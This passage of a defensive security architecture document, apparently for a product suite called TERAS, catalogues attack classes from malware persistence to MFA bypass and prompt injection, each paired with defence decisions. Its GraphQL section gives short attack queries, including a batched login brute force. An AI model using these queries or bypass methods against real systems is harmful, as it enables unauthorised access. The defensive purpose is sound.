â”œâ”€â”€ Memory scanning
â”œâ”€â”€ Heuristic analysis
â”œâ”€â”€ LOLBin monitoring
â””â”€â”€ Fileless attack detection
```

## 2. Malware Behavior Analysis

### 2.1 Behavioral Indicators

```
Behavioral Indicators:

PERSISTENCE:
â”œâ”€â”€ Registry run keys
â”œâ”€â”€ Scheduled tasks
â”œâ”€â”€ WMI subscriptions
â”œâ”€â”€ DLL hijacking
â”œâ”€â”€ Boot execution

DEFENSE EVASION:
â”œâ”€â”€ Process hollowing
â”œâ”€â”€ DLL injection
â”œâ”€â”€ Timestomping
â”œâ”€â”€ Artifact deletion

CREDENTIAL ACCESS:
â”œâ”€â”€ LSASS memory dump
â”œâ”€â”€ SAM database access
â”œâ”€â”€ Kerberos ticket theft
â”œâ”€â”€ Browser credential theft

LATERAL MOVEMENT:
â”œâ”€â”€ PsExec
â”œâ”€â”€ WMI remote execution
â”œâ”€â”€ SMB exploitation
â”œâ”€â”€ RDP hijacking

DATA EXFILTRATION:
â”œâ”€â”€ DNS tunneling
â”œâ”€â”€ HTTP/S channels
â”œâ”€â”€ Cloud storage
â”œâ”€â”€ Encrypted archives

DETECTION APPROACH (ZIRAH):
â”œâ”€â”€ Process behavior modeling
â”œâ”€â”€ API call monitoring
â”œâ”€â”€ Network behavior analysis
â”œâ”€â”€ File system monitoring
â””â”€â”€ Registry monitoring
```

## TERAS Decision L-06

**FOR TERAS:**
1. ZIRAH: Behavioral-first detection
2. Multi-layer analysis (static + dynamic)
3. LOLBin/LOTL monitoring
4. Memory forensics capability

### Architecture Decision ID: `TERAS-ARCH-L06-MALWARE-001`

---

# L-07: Supply Chain Attacks

## 1. Supply Chain Attack Vectors

### 1.1 Attack Surface

```
Supply Chain Attack Categories:

SOURCE CODE:
â”œâ”€â”€ Compromised repository
â”œâ”€â”€ Malicious commit injection
â”œâ”€â”€ Dependency confusion
â””â”€â”€ Typosquatting packages

BUILD SYSTEM:
â”œâ”€â”€ CI/CD compromise
â”œâ”€â”€ Build tool manipulation
â”œâ”€â”€ Artifact tampering
â””â”€â”€ Secret exfiltration

DISTRIBUTION:
â”œâ”€â”€ Package repository compromise
â”œâ”€â”€ Update server hijacking
â”œâ”€â”€ Man-in-the-middle updates
â””â”€â”€ Mirror poisoning

THIRD-PARTY:
â”œâ”€â”€ Vendor compromise
â”œâ”€â”€ MSP/MSSP breach
â”œâ”€â”€ Cloud service compromise
â””â”€â”€ Hardware supply chain

Notable Incidents:
â”œâ”€â”€ SolarWinds SUNBURST (2020)
â”‚   â””â”€â”€ Build system compromise, 18,000 victims
â”œâ”€â”€ Codecov (2021)
â”‚   â””â”€â”€ Bash uploader modified
â”œâ”€â”€ Kaseya VSA (2021)
â”‚   â””â”€â”€ MSP tool exploited for ransomware
â”œâ”€â”€ Log4Shell (2021)
â”‚   â””â”€â”€ Widely used dependency vulnerability
â””â”€â”€ 3CX (2023)
    â””â”€â”€ Desktop app supply chain compromise
```

### 1.2 Defense Framework

```
Supply Chain Security:

SOURCE INTEGRITY:
â”œâ”€â”€ Signed commits (GPG)
â”œâ”€â”€ Branch protection
â”œâ”€â”€ Code review requirements
â”œâ”€â”€ SBOM (Software Bill of Materials)

BUILD INTEGRITY:
â”œâ”€â”€ Reproducible builds
â”œâ”€â”€ Isolated build environments
â”œâ”€â”€ Build provenance (SLSA)
â”œâ”€â”€ Hermetic builds

ARTIFACT INTEGRITY:
â”œâ”€â”€ Signed artifacts
â”œâ”€â”€ Binary transparency
â”œâ”€â”€ Sigstore/cosign
â”œâ”€â”€ in-toto attestations

DEPENDENCY MANAGEMENT:
â”œâ”€â”€ Dependency pinning
â”œâ”€â”€ Hash verification
â”œâ”€â”€ Private mirrors
â”œâ”€â”€ Vulnerability scanning

TERAS REQUIREMENTS:
â”œâ”€â”€ Zero external dependencies
â”œâ”€â”€ Verified build chain
â”œâ”€â”€ Reproducible builds
â”œâ”€â”€ Full provenance
â””â”€â”€ SLSA Level 4 target
```

## TERAS Decision L-07

**FOR TERAS:**
1. Zero third-party dependencies (core principle)
2. Reproducible, verified builds
3. Full SBOM generation
4. SLSA Level 4 compliance

### Architecture Decision ID: `TERAS-ARCH-L07-SUPPLY-CHAIN-001`

---

# L-08: Cloud Security Attacks

## 1. Cloud-Specific Attacks

### 1.1 IAM Attacks

```
Cloud IAM Attack Patterns:

CREDENTIAL COMPROMISE:
â”œâ”€â”€ Leaked access keys (GitHub)
â”œâ”€â”€ Metadata service (IMDS) abuse
â”œâ”€â”€ Environment variable exposure
â””â”€â”€ Hardcoded credentials

PRIVILEGE ESCALATION:
â”œâ”€â”€ IAM policy misconfigurations
â”œâ”€â”€ Role chaining
â”œâ”€â”€ Cross-account access abuse
â”œâ”€â”€ Service account impersonation

PERSISTENCE:
â”œâ”€â”€ Backdoor IAM users
â”œâ”€â”€ Lambda/function backdoors
â”œâ”€â”€ Cloud shell persistence
â”œâ”€â”€ API key creation

AWS-SPECIFIC:
â”œâ”€â”€ iam:CreateAccessKey on other users
â”œâ”€â”€ iam:CreateLoginProfile
â”œâ”€â”€ sts:AssumeRole abuse
â”œâ”€â”€ iam:AttachUserPolicy
â””â”€â”€ ec2:RunInstances (IMDS token theft)

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Least privilege IAM
â”œâ”€â”€ MFA enforcement
â”œâ”€â”€ Credential rotation
â”œâ”€â”€ CloudTrail monitoring
â””â”€â”€ Service control policies
```

### 1.2 Data Exposure

```
Cloud Data Attacks:

STORAGE MISCONFIGURATION:
â”œâ”€â”€ Public S3 buckets
â”œâ”€â”€ Azure blob containers
â”œâ”€â”€ GCS public access
â””â”€â”€ Database exposure

DATA EXFILTRATION:
â”œâ”€â”€ Snapshot sharing
â”œâ”€â”€ AMI sharing
â”œâ”€â”€ Cross-region replication
â””â”€â”€ Backup theft

METADATA ATTACKS:
â”œâ”€â”€ SSRF â†’ IMDS (169.254.169.254)
â”œâ”€â”€ IMDSv1 exploitation
â”œâ”€â”€ Container metadata services
â””â”€â”€ Cloud function environment

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Block public access
â”œâ”€â”€ Encryption at rest
â”œâ”€â”€ VPC endpoints
â”œâ”€â”€ IMDSv2 enforcement
â””â”€â”€ Network segmentation
```

## 2. Container/Kubernetes Attacks

### 2.1 Container Security

```
Container Attack Surface:

IMAGE ATTACKS:
â”œâ”€â”€ Malicious base images
â”œâ”€â”€ Dependency vulnerabilities
â”œâ”€â”€ Embedded secrets
â”œâ”€â”€ Trojanized images

RUNTIME ATTACKS:
â”œâ”€â”€ Container escape
â”œâ”€â”€ Privileged container abuse
â”œâ”€â”€ Host path mounts
â”œâ”€â”€ Capability abuse

KUBERNETES ATTACKS:
â”œâ”€â”€ Exposed API server
â”œâ”€â”€ RBAC misconfiguration
â”œâ”€â”€ Service account abuse
â”œâ”€â”€ etcd exposure
â”œâ”€â”€ Kubelet API access
â”œâ”€â”€ Pod security bypass

SUPPLY CHAIN:
â”œâ”€â”€ Registry compromise
â”œâ”€â”€ CI/CD pipeline attacks
â”œâ”€â”€ Admission controller bypass
â””â”€â”€ GitOps repo poisoning

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Image scanning
â”œâ”€â”€ Runtime protection
â”œâ”€â”€ Network policies
â”œâ”€â”€ Pod security standards
â”œâ”€â”€ RBAC hardening
â””â”€â”€ Secrets management
```

## TERAS Decision L-08

**FOR TERAS:**
1. Cloud-agnostic security design
2. IMDS protection in ZIRAH
3. Container hardening guidelines
4. Kubernetes security policies

### Architecture Decision ID: `TERAS-ARCH-L08-CLOUD-001`

---

# L-09: Mobile Application Attacks

## 1. Mobile Attack Surface

### 1.1 Platform-Specific Attacks

```
Mobile Attack Categories:

iOS ATTACKS:
â”œâ”€â”€ Jailbreak detection bypass
â”œâ”€â”€ Keychain extraction
â”œâ”€â”€ Runtime manipulation (Frida)
â”œâ”€â”€ IPA patching
â”œâ”€â”€ SSL pinning bypass
â””â”€â”€ Entitlement abuse

ANDROID ATTACKS:
â”œâ”€â”€ Root detection bypass
â”œâ”€â”€ APK decompilation/patching
â”œâ”€â”€ Frida/Xposed hooking
â”œâ”€â”€ Intent hijacking
â”œâ”€â”€ Content provider leakage
â”œâ”€â”€ WebView vulnerabilities
â””â”€â”€ Clipboard monitoring

COMMON ATTACKS:
â”œâ”€â”€ Reverse engineering
â”œâ”€â”€ API abuse
â”œâ”€â”€ Session management
â”œâ”€â”€ Insecure data storage
â”œâ”€â”€ Man-in-the-middle
â””â”€â”€ Biometric bypass

MENARA DEFENSE REQUIREMENTS:
â”œâ”€â”€ Obfuscation/protection
â”œâ”€â”€ Runtime integrity checks
â”œâ”€â”€ Certificate pinning
â”œâ”€â”€ Secure storage
â”œâ”€â”€ Anti-tampering
â””â”€â”€ Debugger detection
```

### 1.2 Reverse Engineering Defense

```
Mobile App Protection Layers:

LAYER 1 - OBFUSCATION:
â”œâ”€â”€ Code obfuscation
â”œâ”€â”€ String encryption
â”œâ”€â”€ Control flow flattening
â”œâ”€â”€ Symbol stripping

LAYER 2 - ANTI-TAMPERING:
â”œâ”€â”€ Checksum verification
â”œâ”€â”€ Code signing validation
â”œâ”€â”€ Resource integrity
â”œâ”€â”€ Installer verification

LAYER 3 - ANTI-DEBUG:
â”œâ”€â”€ Debugger detection
â”œâ”€â”€ Timing checks
â”œâ”€â”€ System call monitoring
â”œâ”€â”€ ptrace prevention

LAYER 4 - ENVIRONMENT:
â”œâ”€â”€ Root/jailbreak detection
â”œâ”€â”€ Emulator detection
â”œâ”€â”€ Hook detection
â”œâ”€â”€ Instrumentation detection

LAYER 5 - RUNTIME:
â”œâ”€â”€ Memory protection
â”œâ”€â”€ Method swizzling detection
â”œâ”€â”€ Dynamic library validation
â”œâ”€â”€ Process inspection

MENARA IMPLEMENTATION:
â”œâ”€â”€ All layers implemented
â”œâ”€â”€ Multiple detection methods
â”œâ”€â”€ Response options (graceful â†’ terminate)
â”œâ”€â”€ Server-side verification
â””â”€â”€ Risk scoring
```

## TERAS Decision L-09

**FOR TERAS:**
1. MENARA: Multi-layer protection
2. Detection + response options
3. Server-side risk assessment
4. Continuous protection updates

### Architecture Decision ID: `TERAS-ARCH-L09-MOBILE-001`

---

# L-10: Identity and Authentication Attacks

## 1. Identity Attack Patterns

### 1.1 Credential Attacks

```
Credential Attack Methods:

PHISHING:
â”œâ”€â”€ Spear phishing (targeted)
â”œâ”€â”€ Clone phishing
â”œâ”€â”€ Vishing (voice)
â”œâ”€â”€ Smishing (SMS)
â”œâ”€â”€ Real-time relay (Evilginx)
â””â”€â”€ Browser-in-the-browser

CREDENTIAL THEFT:
â”œâ”€â”€ Keyloggers
â”œâ”€â”€ Form grabbing
â”œâ”€â”€ Memory scraping
â”œâ”€â”€ Clipboard hijacking
â”œâ”€â”€ Screen capture
â””â”€â”€ Traffic interception

PASSWORD ATTACKS:
â”œâ”€â”€ Dictionary attacks
â”œâ”€â”€ Credential stuffing
â”œâ”€â”€ Password spraying
â”œâ”€â”€ Rainbow tables
â”œâ”€â”€ Brute force
â””â”€â”€ Hybrid attacks

PASS-THE-HASH/TICKET:
â”œâ”€â”€ NTLM hash reuse
â”œâ”€â”€ Kerberos ticket theft
â”œâ”€â”€ Golden ticket
â”œâ”€â”€ Silver ticket
â”œâ”€â”€ Overpass-the-hash
â””â”€â”€ Pass-the-certificate

DEFENSE REQUIREMENTS (BENTENG):
â”œâ”€â”€ Phishing-resistant MFA
â”œâ”€â”€ Password breach checking
â”œâ”€â”€ Credential isolation
â”œâ”€â”€ Session binding
â””â”€â”€ Risk-based authentication
```

### 1.2 MFA Bypass Techniques

```
MFA Bypass Methods:

REAL-TIME PHISHING:
â”œâ”€â”€ Proxy victim's session
â”œâ”€â”€ Capture MFA token in transit
â”œâ”€â”€ Evilginx, Modlishka frameworks
â””â”€â”€ Defense: FIDO2/WebAuthn

SIM SWAPPING:
â”œâ”€â”€ Social engineer carrier
â”œâ”€â”€ Port number to attacker SIM
â”œâ”€â”€ Receive SMS codes
â””â”€â”€ Defense: App-based MFA

MFA FATIGUE:
â”œâ”€â”€ Spam push notifications
â”œâ”€â”€ User approves to stop alerts
â”œâ”€â”€ Works with push MFA
â””â”€â”€ Defense: Number matching, rate limiting

HELP DESK SOCIAL ENGINEERING:
â”œâ”€â”€ Call posing as user
â”œâ”€â”€ Request MFA reset
â”œâ”€â”€ Bypass enrollment
â””â”€â”€ Defense: Strong verification procedures

BACKUP CODE THEFT:
â”œâ”€â”€ Phish backup codes
â”œâ”€â”€ Steal from storage
â”œâ”€â”€ Social engineering
â””â”€â”€ Defense: Secure backup code storage

DEVICE COMPROMISE:
â”œâ”€â”€ Steal authenticator seeds
â”œâ”€â”€ Malware on MFA device
â”œâ”€â”€ SIM cloning
â””â”€â”€ Defense: Hardware security keys

BENTENG REQUIREMENTS:
â”œâ”€â”€ FIDO2 primary authentication
â”œâ”€â”€ Risk-based step-up
â”œâ”€â”€ Anomaly detection
â”œâ”€â”€ Device binding
â””â”€â”€ Secure enrollment process
```

## TERAS Decision L-10

**FOR TERAS:**
1. BENTENG: FIDO2/WebAuthn primary
2. No SMS-based MFA
3. Phishing-resistant by default
4. Continuous authentication

### Architecture Decision ID: `TERAS-ARCH-L10-IDENTITY-001`

---

# L-11: Insider Threat Attacks

## 1. Insider Threat Categories

### 1.1 Threat Actors

```
Insider Threat Classification:

MALICIOUS INSIDER:
â”œâ”€â”€ Disgruntled employee
â”œâ”€â”€ Financial motivation
â”œâ”€â”€ Espionage (recruited)
â”œâ”€â”€ Sabotage intent
â””â”€â”€ Data theft for new job

NEGLIGENT INSIDER:
â”œâ”€â”€ Policy violations
â”œâ”€â”€ Accidental exposure
â”œâ”€â”€ Lost devices
â”œâ”€â”€ Phishing victims
â””â”€â”€ Shadow IT usage

COMPROMISED INSIDER:
â”œâ”€â”€ Credential theft victim
â”œâ”€â”€ Malware infection
â”œâ”€â”€ Social engineering target
â”œâ”€â”€ Supply chain compromise
â””â”€â”€ Device compromise

THIRD-PARTY:
â”œâ”€â”€ Contractors
â”œâ”€â”€ Vendors
â”œâ”€â”€ Partners
â”œâ”€â”€ Service providers
â””â”€â”€ Temporary workers

INDICATORS:
â”œâ”€â”€ Unusual access patterns
â”œâ”€â”€ Large data transfers
â”œâ”€â”€ Access outside hours
â”œâ”€â”€ Policy violations
â”œâ”€â”€ Resignation + data access
â””â”€â”€ Financial stress signals
```

### 1.2 Detection Approach

```
Insider Threat Detection:

BEHAVIORAL ANALYTICS:
â”œâ”€â”€ Baseline normal behavior
â”œâ”€â”€ Detect anomalies
â”œâ”€â”€ User risk scoring
â”œâ”€â”€ Peer group comparison
â””â”€â”€ Temporal patterns

DATA LOSS PREVENTION:
â”œâ”€â”€ Content inspection
â”œâ”€â”€ Context analysis
â”œâ”€â”€ Egress monitoring
â”œâ”€â”€ Endpoint monitoring
â””â”€â”€ Cloud DLP

ACCESS MONITORING:
â”œâ”€â”€ Privileged access
â”œâ”€â”€ Data access patterns
â”œâ”€â”€ Authentication events
â”œâ”€â”€ Authorization failures
â””â”€â”€ Resource enumeration

TECHNICAL CONTROLS:
â”œâ”€â”€ Least privilege access
â”œâ”€â”€ Need-to-know enforcement
â”œâ”€â”€ Data classification
â”œâ”€â”€ Encryption at rest
â”œâ”€â”€ Network segmentation

TERAS INTEGRATION:
â”œâ”€â”€ ZIRAH: Endpoint behavior
â”œâ”€â”€ GAPURA: Web activity
â”œâ”€â”€ BENTENG: Access patterns
â”œâ”€â”€ SANDI: Document handling
â””â”€â”€ Cross-product correlation
```

## TERAS Decision L-11

**FOR TERAS:**
1. Built-in behavioral analytics
2. Cross-product correlation
3. Least privilege enforcement
4. Anomaly detection framework

### Architecture Decision ID: `TERAS-ARCH-L11-INSIDER-001`

---

# L-12: Physical Security Attacks

## 1. Physical Attack Vectors

### 1.1 Device Physical Attacks

```
Physical Attack Categories:

DEVICE ACCESS:
â”œâ”€â”€ Evil maid attack
â”œâ”€â”€ Boot device attack
â”œâ”€â”€ JTAG/debug ports
â”œâ”€â”€ Hardware implants
â””â”€â”€ Firmware modification

MEMORY ATTACKS:
â”œâ”€â”€ Cold boot attack
â”œâ”€â”€ DMA attacks (Thunderbolt, PCIe)
â”œâ”€â”€ Bus sniffing
â””â”€â”€ Memory forensics

SIDE CHANNELS:
â”œâ”€â”€ Power analysis
â”œâ”€â”€ EM emanations
â”œâ”€â”€ Acoustic analysis
â”œâ”€â”€ Timing attacks
â””â”€â”€ Visual observation

SUPPLY CHAIN HARDWARE:
â”œâ”€â”€ Intercepted shipments
â”œâ”€â”€ Factory modifications
â”œâ”€â”€ Counterfeit components
â””â”€â”€ Hardware trojans

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Full disk encryption
â”œâ”€â”€ Secure boot
â”œâ”€â”€ TPM-backed keys
â”œâ”€â”€ IOMMU/DMA protection
â”œâ”€â”€ Physical tamper evidence
â””â”€â”€ Secure key destruction
```

### 1.2 Facility Security

```
Facility Attack Vectors:

SOCIAL ENGINEERING:
â”œâ”€â”€ Tailgating
â”œâ”€â”€ Impersonation
â”œâ”€â”€ Pretexting
â”œâ”€â”€ Delivery disguise
â””â”€â”€ Badge cloning

PHYSICAL BYPASS:
â”œâ”€â”€ Lock picking
â”œâ”€â”€ Access card cloning
â”œâ”€â”€ Sensor bypass
â”œâ”€â”€ RFID replay
â””â”€â”€ Fence/barrier bypass

SURVEILLANCE:
â”œâ”€â”€ Visual surveillance
â”œâ”€â”€ Dumpster diving
â”œâ”€â”€ Shoulder surfing
â”œâ”€â”€ Keystroke logging
â””â”€â”€ Network taps

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Multi-factor physical access
â”œâ”€â”€ Mantrap/airlock
â”œâ”€â”€ Visitor management
â”œâ”€â”€ Security awareness
â”œâ”€â”€ Clean desk policy
â””â”€â”€ Secure disposal
```

## TERAS Decision L-12

**FOR TERAS:**
1. Assume physical access possible
2. Hardware security requirements
3. Memory protection mandatory
4. Side-channel resistance

### Architecture Decision ID: `TERAS-ARCH-L12-PHYSICAL-001`

---

# L-13: AI/ML Security Attacks

## 1. ML Model Attacks

### 1.1 Attack Categories

```
AI/ML Attack Surface:

ADVERSARIAL EXAMPLES:
â”œâ”€â”€ Input perturbation
â”œâ”€â”€ Imperceptible changes
â”œâ”€â”€ Targeted misclassification
â”œâ”€â”€ Universal perturbations
â””â”€â”€ Physical adversarial examples

MODEL EXTRACTION:
â”œâ”€â”€ Query-based extraction
â”œâ”€â”€ Model stealing
â”œâ”€â”€ API abuse
â”œâ”€â”€ Side-channel extraction
â””â”€â”€ Hyperparameter inference

DATA POISONING:
â”œâ”€â”€ Training data manipulation
â”œâ”€â”€ Label flipping
â”œâ”€â”€ Backdoor insertion
â”œâ”€â”€ Federated learning attacks
â””â”€â”€ Transfer learning poisoning

MODEL INVERSION:
â”œâ”€â”€ Recover training data
â”œâ”€â”€ Membership inference
â”œâ”€â”€ Property inference
â”œâ”€â”€ Attribute inference
â””â”€â”€ Privacy leakage

PROMPT INJECTION (LLM):
â”œâ”€â”€ Direct prompt injection
â”œâ”€â”€ Indirect prompt injection
â”œâ”€â”€ Jailbreaking
â”œâ”€â”€ Data exfiltration
â””â”€â”€ Privilege escalation

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Adversarial training
â”œâ”€â”€ Input validation
â”œâ”€â”€ Model monitoring
â”œâ”€â”€ Query rate limiting
â”œâ”€â”€ Differential privacy
â””â”€â”€ Secure aggregation
```

### 1.2 ML in Security Tools

```
ML Security Tool Attacks:

EVASION:
â”œâ”€â”€ Bypass ML-based detection
â”œâ”€â”€ Generate adversarial samples
â”œâ”€â”€ Feature manipulation
â”œâ”€â”€ Gradient-based evasion
â””â”€â”€ Black-box attacks

POISONING:
â”œâ”€â”€ Corrupt training feedback
â”œâ”€â”€ Report false positives
â”œâ”€â”€ Manipulate labels
â””â”€â”€ Drift inducement

GAMING:
â”œâ”€â”€ Learn detection thresholds
â”œâ”€â”€ Probe for blind spots
â”œâ”€â”€ Optimize for evasion
â””â”€â”€ Reverse engineer models

TERAS ML REQUIREMENTS:
â”œâ”€â”€ Robust models
â”œâ”€â”€ Ensemble approaches
â”œâ”€â”€ Human-in-the-loop
â”œâ”€â”€ Regular retraining
â”œâ”€â”€ Concept drift detection
â””â”€â”€ Explainability
```

## TERAS Decision L-13

**FOR TERAS:**
1. Adversarial-robust detection
2. Multi-modal verification
3. Human oversight for critical decisions
4. Explainable detection

### Architecture Decision ID: `TERAS-ARCH-L13-AIML-001`

---

# L-14: Zero-Day Exploitation

## 1. Zero-Day Attack Lifecycle

### 1.1 Zero-Day Characteristics

```
Zero-Day Attack Chain:

DISCOVERY:
â”œâ”€â”€ Vulnerability research
â”œâ”€â”€ Fuzzing
â”œâ”€â”€ Code audit
â”œâ”€â”€ Purchased from broker
â””â”€â”€ Bug bounty acquisition

WEAPONIZATION:
â”œâ”€â”€ Exploit development
â”œâ”€â”€ Reliability engineering
â”œâ”€â”€ Payload development
â”œâ”€â”€ Evasion techniques
â””â”€â”€ Delivery mechanism

DEPLOYMENT:
â”œâ”€â”€ Targeted attacks
â”œâ”€â”€ Watering holes
â”œâ”€â”€ Strategic compromise
â”œâ”€â”€ Supply chain insertion
â””â”€â”€ Physical delivery

DETECTION CHALLENGES:
â”œâ”€â”€ No signature exists
â”œâ”€â”€ Unknown vulnerability
â”œâ”€â”€ Novel technique
â”œâ”€â”€ Limited indicators
â””â”€â”€ Attribution difficulty

ZERO-DAY ECONOMICS:
â”œâ”€â”€ Bug bounties: $10K-$2M+
â”œâ”€â”€ Grey market: $50K-$2.5M
â”œâ”€â”€ Nation-state value: Priceless
â””â”€â”€ Average exposure: 7+ years (some)
```

### 1.2 Zero-Day Defense

```
Zero-Day Mitigation Strategies:

REDUCE ATTACK SURFACE:
â”œâ”€â”€ Minimize exposed software
â”œâ”€â”€ Remove unnecessary features
â”œâ”€â”€ Network segmentation
â”œâ”€â”€ Least privilege
â””â”€â”€ Application isolation

DEFENSE IN DEPTH:
â”œâ”€â”€ Multiple security layers
â”œâ”€â”€ No single point of failure
â”œâ”€â”€ Assume breach mentality
â”œâ”€â”€ Compensating controls
â””â”€â”€ Defense diversity

BEHAVIORAL DETECTION:
â”œâ”€â”€ Anomaly detection
â”œâ”€â”€ Heuristic analysis
â”œâ”€â”€ Sandbox analysis
â”œâ”€â”€ Memory analysis
â””â”€â”€ Network behavior analysis

EXPLOIT MITIGATION:
â”œâ”€â”€ ASLR (high entropy)
â”œâ”€â”€ CFI/CET
â”œâ”€â”€ Sandboxing
â”œâ”€â”€ Capabilities/MAC
â””â”€â”€ Memory safety

RAPID RESPONSE:
â”œâ”€â”€ Threat intelligence
â”œâ”€â”€ Incident detection
â”œâ”€â”€ Containment procedures
â”œâ”€â”€ Forensic capability
â””â”€â”€ Communication plan

TERAS APPROACH:
â”œâ”€â”€ Memory-safe core
â”œâ”€â”€ Formal verification
â”œâ”€â”€ Behavioral detection
â”œâ”€â”€ Minimal attack surface
â””â”€â”€ Rapid patching
```

## TERAS Decision L-14

**FOR TERAS:**
1. Assume zero-days will be used
2. Defense in depth mandatory
3. Behavioral detection primary
4. Memory safety eliminates classes

### Architecture Decision ID: `TERAS-ARCH-L14-ZERODAY-001`

---

# L-15: API Security Attacks

## 1. API Attack Taxonomy

### 1.1 OWASP API Top 10

```
API Security Risks (OWASP 2023):

API1: BROKEN OBJECT LEVEL AUTHORIZATION
â”œâ”€â”€ IDOR (Insecure Direct Object Reference)
â”œâ”€â”€ Access other users' data
â”œâ”€â”€ Predictable resource IDs
â””â”€â”€ Defense: Authorization per object

API2: BROKEN AUTHENTICATION
â”œâ”€â”€ Weak token security
â”œâ”€â”€ No rate limiting
â”œâ”€â”€ Credential stuffing
â””â”€â”€ Defense: Strong auth mechanisms

API3: BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION
â”œâ”€â”€ Mass assignment
â”œâ”€â”€ Excessive data exposure
â”œâ”€â”€ Property-level access control
â””â”€â”€ Defense: Allowlist properties

API4: UNRESTRICTED RESOURCE CONSUMPTION
â”œâ”€â”€ No rate limiting
â”œâ”€â”€ Resource exhaustion
â”œâ”€â”€ DoS via expensive operations
â””â”€â”€ Defense: Rate limiting, quotas

API5: BROKEN FUNCTION LEVEL AUTHORIZATION
â”œâ”€â”€ Access admin functions
â”œâ”€â”€ Method manipulation
â”œâ”€â”€ Role bypass
â””â”€â”€ Defense: Function-level checks

API6: UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS
â”œâ”€â”€ Automated abuse
â”œâ”€â”€ Scalping, fraud
â”œâ”€â”€ Business logic bypass
â””â”€â”€ Defense: Flow rate limiting

API7: SERVER-SIDE REQUEST FORGERY
â”œâ”€â”€ Internal service access
â”œâ”€â”€ Cloud metadata access
â”œâ”€â”€ Port scanning
â””â”€â”€ Defense: Input validation, network controls

API8: SECURITY MISCONFIGURATION
â”œâ”€â”€ Default credentials
â”œâ”€â”€ Unnecessary features
â”œâ”€â”€ Missing security headers
â””â”€â”€ Defense: Hardening standards

API9: IMPROPER INVENTORY MANAGEMENT
â”œâ”€â”€ Shadow APIs
â”œâ”€â”€ Deprecated endpoints
â”œâ”€â”€ Documentation gaps
â””â”€â”€ Defense: API inventory, lifecycle

API10: UNSAFE CONSUMPTION OF APIs
â”œâ”€â”€ Third-party API trust
â”œâ”€â”€ Insufficient validation
â”œâ”€â”€ Data injection via upstream
â””â”€â”€ Defense: Validate all input

GAPURA REQUIREMENTS:
â”œâ”€â”€ All API Top 10 protection
â”œâ”€â”€ Automatic API discovery
â”œâ”€â”€ Schema enforcement
â”œâ”€â”€ Rate limiting framework
â””â”€â”€ Business logic protection
```

## 2. GraphQL Security

### 2.1 GraphQL Attacks

```
GraphQL-Specific Attacks:

INTROSPECTION ABUSE:
query {
  __schema {
    types { name fields { name } }
  }
}
Defense: Disable in production

QUERY DEPTH ATTACK:
query {
  user {
    friends {
      friends {
        friends { ... }
      }
    }
  }
}
Defense: Query depth limiting

BATCHING ATTACK:
[
  {"query": "mutation { login(user:\"a\", pass:\"1\") }"},
  {"query": "mutation { login(user:\"a\", pass:\"2\") }"},
  ...
]
Defense: Batch/rate limiting

ALIAS ATTACK:
query {
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  ...
}
Defense: Alias limiting

FIELD DUPLICATION:
query {
  user {
    name name name name name
    email email email email
  }
}
Defense: Duplicate field blocking

GAPURA GRAPHQL PROTECTION:
â”œâ”€â”€ Query complexity analysis
â”œâ”€â”€ Depth limiting
â”œâ”€â”€ Rate limiting per operation
â”œâ”€â”€ Field-level authorization
â””â”€â”€ Persisted queries only option
```

## TERAS Decision L-15

**FOR TERAS:**
1. GAPURA: Full API security
2. GraphQL-aware protection
3. Schema-based validation
4. Business logic framework

### Architecture Decision ID: `TERAS-ARCH-L15-API-001`

---

# L-16 through L-20: Advanced Attack Research

## L-16: Firmware and Hardware Attacks

```
Firmware Attack Surface:
â”œâ”€â”€ UEFI vulnerabilities
â”œâ”€â”€ BMC/IPMI attacks
â”œâ”€â”€ Network device firmware
â”œâ”€â”€ IoT device firmware
â”œâ”€â”€ PCI option ROM
â””â”€â”€ USB device firmware

TERAS Considerations:
â”œâ”€â”€ Verified boot requirements
â”œâ”€â”€ Firmware integrity monitoring
â”œâ”€â”€ Update authentication
â””â”€â”€ Hardware root of trust

Decision ID: TERAS-ARCH-L16-FIRMWARE-001
```

## L-17: Wireless and RF Attacks

```
Wireless Attack Categories:
â”œâ”€â”€ WiFi (WPA2/3 attacks, PMKID, KRACK)
â”œâ”€â”€ Bluetooth (BlueBorne, KNOB, BIAS)
â”œâ”€â”€ NFC/RFID (relay, clone, sniff)
â”œâ”€â”€ Cellular (IMSI catcher, SS7)
â”œâ”€â”€ SDR attacks
â””â”€â”€ Satellite communications

MENARA Requirements:
â”œâ”€â”€ Secure wireless configuration
â”œâ”€â”€ NFC security for payments
â”œâ”€â”€ BLE security guidelines
â””â”€â”€ WiFi security enforcement

Decision ID: TERAS-ARCH-L17-WIRELESS-001
```

## L-18: Social Engineering Attacks

```
Social Engineering Taxonomy:
â”œâ”€â”€ Phishing (email, voice, SMS)
â”œâ”€â”€ Pretexting
â”œâ”€â”€ Baiting
â”œâ”€â”€ Quid pro quo
â”œâ”€â”€ Tailgating
â””â”€â”€ Business email compromise

Human-Focused Defense:
â”œâ”€â”€ Security awareness training
â”œâ”€â”€ Phishing simulation
â”œâ”€â”€ Incident reporting culture
â”œâ”€â”€ Verification procedures
â””â”€â”€ Technical controls support

Decision ID: TERAS-ARCH-L18-SOCIAL-001
```

## L-19: Denial of Service Attacks

```
DoS Attack Categories:
â”œâ”€â”€ Volumetric (UDP flood, amplification)
â”œâ”€â”€ Protocol (SYN flood, Ping of Death)
â”œâ”€â”€ Application (Slowloris, HTTP flood)
â”œâ”€â”€ Resource exhaustion
â”œâ”€â”€ Algorithmic complexity
â””â”€â”€ Distributed (DDoS)

GAPURA DDoS Protection:
â”œâ”€â”€ Rate limiting
â”œâ”€â”€ Connection limits
â”œâ”€â”€ Request validation
â”œâ”€â”€ Anomaly detection
â”œâ”€â”€ CDN integration
â””â”€â”€ Anycast distribution

Decision ID: TERAS-ARCH-L19-DOS-001
```

## L-20: Attack Research Integration

```
